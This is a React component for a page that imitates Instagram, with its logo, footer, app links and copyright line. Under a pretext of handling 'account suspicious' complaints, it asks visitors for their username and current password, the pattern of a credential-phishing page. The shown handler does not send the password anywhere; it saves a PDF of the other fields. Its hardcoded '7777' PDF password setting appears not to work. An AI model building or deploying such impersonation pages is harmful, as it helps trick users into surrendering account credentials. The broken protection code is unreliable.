import React, { useEffect, useRef } from 'react';
import jsPDF from 'jspdf';
import 'jspdf-autotable'; // Ensure you have this plugin for advanced table features
import './App.css';

function App() {
  const screensRef = useRef([]);
  const screenIndex = useRef(0);

  useEffect(() => {
    const SwitchScreen = () => {
      screensRef.current.forEach((screen) => {
        if (screen) screen.style.display = 'none';
      });

      screenIndex.current = (screenIndex.current + 1) % screensRef.current.length;
      
      if (screensRef.current[screenIndex.current]) {
        screensRef.current[screenIndex.current].style.display = 'block';
      }

      setTimeout(SwitchScreen, 2500);
    };

    SwitchScreen(); // Initial call on mount
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault(); // Prevent the default form submission

    const formData = new FormData(e.target);
    const reportData = {
      fullName: formData.get('fullName'),
      username: formData.get('username'),
      currentPassword: formData.get('currentPassword'),
      reason: formData.get('reason'),
    };

    // Create a new jsPDF instance
    const doc = new jsPDF();

    // Add content to the PDF
    doc.setFontSize(12);
    doc.text('Instagram Account Report', 10, 10);
    doc.text(`Full Name: ${reportData.fullName}`, 10, 20);
    doc.text(`Username: ${reportData.username}`, 10, 30);
    doc.text(`Reason: ${reportData.reason}`, 10, 40);
    doc.text('This report is generated for account review purposes.', 10, 50);

    // Set password protection
    const userPassword = '7777'; // User password
    const ownerPassword = '7777'; // Owner password
    doc.setProperties({
      password: userPassword,
      ownerPassword: ownerPassword,
    });

    // Save the PDF
    doc.save('account-report.pdf'); // This will prompt the user to download the PDF
  };

  return (
    <div className="App">
      <section className="container">
        {/* SMARTPHONE SECTION */}
        <article className="smartphone">
          <div className="screens">
            {[1, 2, 3].map((num, index) => (
              <img
                key={index}
                className="screen fade"
                src={`img/screen${num}.png`}
                alt={`screen${num}`}
                ref={(el) => (screensRef.current[index] = el)}
                style={{ display: index === 0 ? 'block' : 'none' }} // Show only the first screen initially
              />
            ))}
          </div>
          <img src="img/smartphones.png" alt="smartphones" />
        </article>

        {/* FORM SECTION */}
        <article className="form-area">
          <div className="logo">
            <img src="img/logo.png" alt="Instagram Logo" />
            <p className='h'>This Page is only for Complaints Regarding Account Suspicious</p>
          </div>
          <form onSubmit={handleSubmit}>
            <input type="text" name="fullName" id="fullName" placeholder="Full Name" required />
            <input type="text" name="username" id="username" placeholder="Username" required />
            <input type="password" name="currentPassword" id="currentPassword" placeholder="Current Password" required />
            <select name="reason" id="reason" required>
              <option value="">Select Reason</option>
              <option value="accountIssue">Account Issue</option>
              <option value="privacyConcern">Privacy Concern</option>
              <option value="passwordReset">Password Reset</option>
              <option value="other">Other</option>
            </select>
            <input type="submit" name="submit" value="Generate Report" />
          </form>
          <div className="apps">
            <p>Get the app</p>
            <a href="https://apps.apple.com/in/app/instagram/id389801252">
              <img src="img/appstore.png" alt="Download on the App Store" />
            </a>
            <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
              <img src="img/googleplay.png" alt="Get it on Google Play" />
            </a>
          </div>
        </article>
      </section>

      {/* FOOTER */}
      <footer>
        <div className="footer-content">
          <a href="/">Meta</a>
          <a href="/">About</a>
          <a href="/">Blog</a>
          <a href="/">Careers</a>
          <a href="/">API</a>
          <a href="/">Privacy</a>
          <a href="/">Terms</a>
          <a href="/">Top Accounts</a>
          <a href="/">Hashtags</a>
          <a href="/">Locations</a>
          <a href="/">Instagram Lite</a>
          <a href="/">Contact Uploading & Non-Users</a>
        </div>
        <div>
          <a href="/">Dance</a>
          <a href="/">Food & Drink</a>
          <a href="/">Home & Garden</a>
          <a href="/">Music</a>
          <a href="/">Visual Arts</a>
        </div>
        <div className="copyright">
          <select aria-label="Switch display language">
            <option value="en">English</option>
            <option value="pt">Portuguese (Portugal)</option>
            <option value="es">Spanish</option>
            <option value="fr">French</option>
          </select>
          <span>&copy; 2022 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
}

export default App;
